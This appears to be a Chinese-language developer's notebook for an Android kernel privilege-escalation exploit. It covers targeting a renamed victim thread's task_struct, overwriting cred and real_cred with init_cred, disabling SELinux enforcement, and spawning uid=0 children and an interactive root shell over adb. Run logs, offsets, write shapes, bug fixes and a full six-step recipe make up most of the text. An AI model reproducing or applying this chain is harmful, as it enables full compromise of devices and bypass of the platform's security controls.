* 子进程一趟扫描**同时**认两个标记（`sla_result` 增加 `task2/n_hit2/agree2`），
  两个标记都要"多条记录给出的 ptr 完全一致"才允许发弹（`USEMAIN && (!MTASK || !agree2) ⇒ 不发`）；
* 提权相的目的地址统一走 `(USEMAIN ? MTASK : TASK)`；相4 的判据在 USEMAIN 下读 main 自己的
  `getuid()/geteuid()`；相7 在 USEMAIN 下由 **main** `kid_new()` 生孩子。
* 默认仍是打 W（保守），只有 mode 里带 `mtarget` 才切过去。

⇒ 现在的相序（`mtarget`）：**相0 漏 S → 相1 permissive → 相3 `*(main+0x848)=init_cred`
→ 相4 非对齐纯零写 `*(init_cred+4)=0` → 相7 main 生孩子 exec `id`**，一共只两发危险写，
每发都有开打前算好的定量判据。real_cred（相5/相6）留作可选补强。

## 17. `mtarget` 实测踩空 ⇒ 靶子最终定为"改名过的旁观**线程**"(`victim`)

m1 轮 (`cm57/run_m1.log`) 把 §16 的实现跑了一遍：

```
[M]   main 的 comm = [gm3c62]  USEMAIN=1
[SLA] 子进程扫完: err=0 命中=8 task=ffffffaeb0180000 一致=1 | main: 命中=0 task=0 一致=0
[SEN] × 认不出自己的 task_struct ⇒ 一发不盲打 ⇒ 收工      ← 安全门按设计挡住了, 没有盲打
```

⇒ **W(一条改过名的 pthread)的记录实测每轮都在表里, 而 main(进程主线程)的那一条扫不到。**
两条一手事实顺带修正了 §16 的假设：
1. 表里"能被认出来"的单位是**线程**, 且改过名的线程一定在(W 就是); 主线程那一条反而不在
   (原因未查证 —— 可能是这张表按调度实体/大核集群采样, 也可能主线程那行的 comm 是别的写法);
2. 第二趟搜索**不能**把早退条件写成"两个标记合计几条" —— main 的标记命中不到时, 那等于
   整窗 519MB 重扫一遍, 一轮卡十分钟(sen m1 就是这么废掉的)。已改成: 第一趟只认主标记
   (8 条即收), 第二趟只在主标记命中区 ±64MB 里认第二个标记(4 条即收)。

⇒ 于是把 §16 的想法收尾成真正需要的那个性质 —— **靶子不必是 main, 只需要"链走绝不碰"**:
新增一条旁观 pthread (`victim_thread`), 出生即 `prctl` 改名成 `gk<pid低16><tid低16>`
(与 W 同一招, 所以"在表里能找到"是被实测保证的), 它一辈子只做两件事:
`getuid()/geteuid()` 自报进 `v_uid/v_euid/v_seq`, 以及在收到 `v_dokid` 时**自己** clone 孩子。
提权两发的目的改成它的 `task_struct`：

* 相3 `*(VT+0x848) = init_cred` ⇒ 判据 `v_uid == (VT+0x840)>>32`(开打前算好的预言)
* 相4 非对齐纯零写 `*(init_cred+4) = 0` ⇒ 判据 `v_uid==0 && v_euid==0`
* 相7 `v_dokid=1` ⇒ 靶子线程亲生孩子 exec `id` ⇒ 日志里出现 `uid=0(root)` 就是凭证

链走经过的对象是 `waiter->task`(=我们填的 init_task) 与 `current`(=punch 的 main),
两者都不是 VT ⇒ 换 VT 的 cred 不参与那条路径的任何一次解引用。

## 18. ★★★ 临时 root 达成（v2 轮，2026-09-28 16:4x，一枪未炸）

`cm57/run_v2.log` / 设备端 `/data/local/tmp/pr.log`。这一轮用的就是 §17 的 **victim 靶子**
（一条只自报 uid、不参与 futex 的改名 pthread），slide=1506e00000：

```
[SLA] 表所在段: 主标记命中 8 条, 偏移 63078408..521412520 (±64MB 之内找第二个标记)
[SLA] 子进程扫完: 命中=8 task=ffffff87adfc5780 一致=1 | main task=ffffff87ae645780 (hits 1 agree 1) USEMAIN=1
[SLA] (B) 采信 算法值 init_cred = ffffffd51973d528 (kallsyms@1293d528 + slide=1506e00000)
[h]   #3 相3 即将 punch nice=18
[W]   sen 相3(形状2:指针写): 目的=ffffff87ae645fc8 值=ffffffd51973d528      ← 目的 = 靶子+0x848
[SEN] 相3: 自报 uid=-121 euid=0 (seq 2→3) 预言 uid=-121((task+0x840) 的高 32 位) ⇒ ★★★ 定量命中
[h]   #4 相4 即将 punch nice=19
[W]   sen 相4(形状1:纯零写): 目的=ffffffd51973d52c 值=0000000000000000     ← init_cred+4
[SEN] 相4: uid=0 euid=0 ⇒ ★★★ 主观 cred 已是 init_cred ⇒ uid0 + 全 caps
[X]   sen 相7(VICTIM): 不 punch, 由靶子线程自己 clone 孩子
[k]   放 2 个孩子去 exec
[KID>out] KID 18306 / KID 18305
          uid=0(root) uid=0(root) gid=0(root) gid=0(root) groups=0(root) groups=0(root)
          context=u:r:kernel:s0 context=u:r:kernel:s0
[KID>out] ★★★ 内核亲自给了这个孩子 uid=0(root) ⇒ 临时 root 到手
[DONE] 全流程结束(没炸)
```

同一轮里 ghost 的持有者 W(tid=15638)**每次自报都还是 `getuid()=2000`** —— 靶子是另一条线程 ⇒
§15.1 的定位("换掉链走正在改动的那个 task 的 cred"才是 5/6 次炸机的原因)被正面证实。

四个判据层次，从弱到强：
1. **相3 的定量预言**：写进去的值是 init_cred，配对写把 `task+0x840` 盖在 `usage+uid` 上
   ⇒ `getuid()` 必然 = `(task+0x840)>>32` = -121，实测 -121（**开打前算好的数**）。
2. **相4 之后** `getuid()==0 && geteuid()==0`：说明 cred 指针真的被换、且那份 cred 的 id 栏可读。
3. **两个孩子由内核 fork/exec 出来就是 `uid=0(root) gid=0(root) groups=0(root)`**：
   不是我们自己 setuid（shell 域里 setuid(0) 必 EPERM），而是 `copy_creds()` 继承了 init_cred。
4. SELinux 域变成 `u:r:kernel:s0`（init_cred 自带的 sid）+ `/sys/fs/selinux/enforce` 读到 `0`
   ⇒ MAC 侧也已经是"内核自己的身份"。

⇒ 剩下的都是"要不要更完整"而不是"能不能"：相5/相6（把 `real_cred` 也换成 init_cred，
`/proc/<pid>/status` 的 real 栏才会从 2000 变 0）、以及 v3 轮加的孩子侧功能验证
（`cat /proc/1/environ` —— shell 读它必然 EACCES，读得动才证明不只有 uid0，而是真拿到
`CAP_SYS_PTRACE` 这一类能力）。

## 19. 为什么 v5/v6/g01 三轮"认不出 task"是**我自己的代码 bug**，不是通道失效

复盘（`cm57/run_v5.log` / `run_v6.log` / `run_g01.log` 的 `[SLA]` 行）：

| 轮 | 现象 | 真因 |
|---|---|---|
| v5 | 靶子记录 `hits 0` | 第二趟搜索范围写成"主标记命中区 ±64MB"，而靶子那条记录在**更低偏移**上 ⇒ 永远扫不到 |
| v6 | 主标记 `一致=0`（8 条给出不同 ptr） | 我删第二趟时用 splice 顺手删掉了 `sla_sh->agree = ...` 这一行 ⇒ agree 永远是 0 |
| g01 | 靶子 `hits 2 agree 1` **已经认出来了**，却仍报"认不出自己的 task_struct" | `find_self_task()` 结尾固定 `return sla_sh->task`（主标记那一份），而 VICTIM 模式下早退只看靶子 ⇒ 主标记可能一条都没收 ⇒ 返回 0 把已经拿到的靶子丢了 |

三条都是同一类错误：**判据/返回值写死成"我最初假设的那个对象"**，改了设计没改return。
已修：
* 一趟扫描同时收两个标记，**早退条件只看"这次真正需要的那一个"**（`ml2 ? seen2>=2 : seen>=8`）；
* 门也按模式分开：`!USEMAIN` 才要求主标记的 task/agree；`USEMAIN` 要求 `MTASK && agree2`；
* `find_self_task()` 末尾 `return USEMAIN ? MTASK : sla_sh->task`（缓存路径同样）。

顺带记录一个正面事实：g01 轮在**没有**提权成功的情况下，两个孩子 exec 出来的 `id` 仍是
`uid=2000(shell) ... context=u:r:shell:s0`，且 `/sys/fs/selinux/enforce` 读到 `0`、`getenforce` 报
`Permissive` ⇒ 举证链不会假阳：没提权就报 2000，提了才报 0(root)（v2 就是 0(root)+`u:r:kernel:s0`）。

## 20. 复现 + 能力级举证（grind 第 1 轮，`cm57/run_g01.log`，全程 316s）

修掉 §19 那三个自身 bug 之后，第一轮就复现了，而且是**另一个 boot、另一组数**：

```
相3(写 task+0x848 = ffffffd51973d528… 本轮 = ffffffdfcfb3d528):
    预言 uid=-120((task+0x840) 的高 32 位)  →  实测 uid=-120 euid=0   ⇒ ★★★ 定量命中
相4(形状1:纯零写): 目的=ffffffdfcfb3d52c(=init_cred+4) 值=0
    → 靶子自报 uid=0 euid=0
[KID>out] KID 16059 / KID 16058
   uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0        ← 两个孩子都是
   PATH=/product/bin:/apex/com.android.runtime/bin:/apex/com.android.art/bin:/system_ext/bin:…
   ↑↑ 这是 **`/proc/1/environ` 的内容**：shell 读它必然 EACCES（要 ptrace 许可 + uid0）
      ⇒ 拿到的不只是 uid=0 这个数字，而是 init_cred 的**全套能力**（CAP_SYS_PTRACE 等）
[KID>out] ★★★ 内核亲自给了这个孩子 uid=0(root) ⇒ 临时 root 到手
[k] enforce='0'  getenforce=Permissive      设备全程没重启（316s 一轮，含开机与解 slide）
```

⇒ 命中判据从此分成三档，任一人可复核：① 相3 的 `getuid()` 等于**开打前算出的**配对写残渣值；
② 相4 之后 `getuid()/geteuid()==0`；③ 靶子亲生孩子 `id` = `uid=0(root)` 且**读得动
`/proc/1/environ`**。第三档是能力级的：它要求 `CAP_SYS_PTRACE` + DAC 归属，纯靠 `setuid()`
在 shell 域里做不到（实测 EPERM/EACCES）。

⇒ 时间账也清楚了：整轮 316s（重启到出结果），其中扫描只占几秒 —— 之前 sen24 的 140s 被
低内存杀手收走，就是因为扫描顺手算了 `win_anchor`/众数。常规提权路径现在只扫 comm 记录。

---

## 21. ★★ 四发全链（主观+客观都归位）+ 一条挂在 adb 会话上的 root 通道（g01 第二轮，18:19 boot）

这一轮把 §20 剩下的两件事一起做完了：**相5/相6 把 `real_cred` 也接上**，以及
**把"证明有 root"变成"用得上 root"**。

### 四发的实际落地（`cm57/run_g01.log` 第 92-109 行，设备端 `cm57/run_g01_dev_pr.log`）

```
靶子 TASK = ffffffb5ee606900      init_cred(ICRED) = ffffffd862d3d528
相3 形状2(指针写) 目的=task+0x848 值=ICRED   → W 自报 uid=-75  预言 uid=-75((task+0x840) 高 32 位)  ★★★ 定量命中
相4 形状1(纯零写) 目的=ICRED+4                → 靶子自报 uid=0 euid=0                             ★★★ 主观 root
相5 形状2(指针写) 目的=task+0x840 值=ICRED   → /proc/15213/status Uid=-75,0,0,0                   ★★★ 客观槽接上
相6 形状1(纯零写) 目的=ICRED+4                → /proc Uid=0,0,0,0 Gid=0,0,0,0 且靶子 uid=0 euid=0  ★★★ 八栏全 0
```

三点值得钉住：
1. **相5 的配对写又把 `init_cred.uid` 弄脏成同一个预言值**（-75），与相3 一模一样 ⇒ 这不是
   巧合，是几何的必然（`*(val) = dst-8`，两发的 `dst-8` 高 32 位相同）⇒ **同一判据复用两次都命中**。
2. **相6 只需要再一行纯零写 `*(ICRED+4)=0`**，因为两发脏的是**同一份** cred 对象的同一栏 ⇒
   主观/客观两个槽共享对象，一次还原两边一起干净。`/proc` 的 Uid/Gid 八栏与靶子自报同时归 0。
3. 四发**一发没炸**，设备全程没重启（round 320s，含冷启动与解 slide）。

### root 通道的形态（新增 mode 词 `shell` / `ishell`）

举证孩子**不再走管道**：它原样继承拉起 `pr` 的那个 adb 会话的 fd0/1/2 去 `exec sh`。
本轮（`cm57/run_g01.log` 第 14-20 行，pid 16146）在会话 stdout 上直接回来：

```
KID 16146
init-environ: PATH=/product/bin:/apex/com.android.runtime/bin:/apex/com.android.art/bin:/system_ext/bin:…
sla-read:     OK          ← /proc/sla/wlan_stats（enforcing 下 shell 连 stat 都 EACCES）
packages.xml: OK          ← /data/system/packages.xml（0640 system:system）
getenforce:   Permissive
caps:         CapEff 0000003fffffffff   ← 40 位能力全开
```

- `shell` = 只跑这一串**只读**举证就退出 ⇒ 自动化轮次不会被卡住（本轮 waitpid 1s 就回来了）。
- `ishell` = 额外在 `isatty(0)` 成立时 `exec /system/bin/sh` ⇒ 真人在 `adb shell` 里手跑就是
  一个挂在会话上的**交互式 root shell**；不写盘、不装 setuid 助手、不改任何持久配置，
  重启即全部消失。
- 交互式的举证孩子与 shell 孩子都**必须由靶子线程亲生**（`v_dokid`）：孩子继承的是
  `p->cred`，main/别的线程的 cred 没被改过。

### 现在这条线的完整配方（六步，全在一发 boot 里）

1. 冷启动 → `sp` 自检 → 正对照采 IP → 解出本次 slide（每 boot 必变）。
2. 相0：形状3 把悬空 waiter 的栈地址 S 漏进 `init_uts_ns` 的零洞，`uname()` 读回。
3. 相1：带内假 lock + 形状2 幂等指针写 `selinux_state.enforcing`←0（判据 = enforcer 侧文件内容变 0 + 真 MAC 关卡放开）。
4. 相2：`/proc/sla/*_stats` 的 mmap 物理窗口里按 comm 认出靶子线程的 `task_struct`（多份记录必须一致）。
5. 相3/相4：`cred ← init_cred` + 非对齐零写还原 uid/gid ⇒ 主观 root。
6. 相5/相6：`real_cred ← init_cred` + 第二次还原 ⇒ 客观 root；相7 由靶子亲生 exec ⇒ uid=0(root)+kernel 域。

**遗留的诚实记账**：`init_cred` 是全局对象，本轮把它的 uid/gid 短暂弄脏过（值=残渣、随后归 0），
最终状态与真值一致（uid=0/gid=0），但 **`usage` 计数没被验证过是否与原值逐位相同**——
载荷刻意只写 `+4` 起 8 字节来避开它，且 CONFIG_REFCOUNT 是 checked 版（归零会打
`refcount_warn_saturate`，本机没有事后内核日志可查）。设备重启即全部复原，不做持久化。
